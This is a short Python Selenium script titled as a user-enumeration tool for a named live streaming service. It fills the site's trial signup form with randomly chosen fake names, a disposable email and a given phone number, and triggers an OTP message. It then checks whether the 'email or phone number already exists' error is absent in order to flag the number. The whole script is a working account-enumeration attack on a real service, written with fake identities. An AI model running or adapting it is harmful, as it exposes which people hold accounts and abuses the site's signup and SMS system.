#  User Enum Appollo
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from time import sleep
import extract_html_diff
import random

driver = webdriver.Edge(executable_path='msedgedriver')
c = ["Santiago Minosu", "Mateo adirich", "Juan Huelo", "Matías Sequira", "Nicolas Brench", "Benjamin lee", "Pedro wilis", "Tomas kurein"]

for i in ["7742434433"]:

    name = random.choice(c)
    emai = "bogiki8188@shzsedu.com"
    pno = i
    driver.get("https://www.apollogroup.tv/#")
    p1 = driver.page_source
    sleep(2)
    elem=driver.find_element_by_xpath("//*[@id='trial_form']")
    elem.click()
    sleep(1)
    elem=driver.find_element_by_id("firstname")
    elem.send_keys(name)
    sleep(1)
    elem=driver.find_element_by_xpath("//input[@type='email']") #type = 'text'/'email'
    elem.send_keys(emai)
    sleep(1)
    elem=driver.find_element_by_name("mobile_number")
    elem.send_keys(pno)
    sleep(1)
    elem=driver.find_element_by_xpath("//*[@id='send_otp_message']")
    elem.click()
    sleep(3)
    p2 = driver.page_source
    p3 = extract_html_diff.as_string(p2,p1)
    sleep(3)

    if "Error: Either email or phone number already exists." not in p3:
        print(pno)
        sleep(10000000000000000000000000)
    sleep(5)
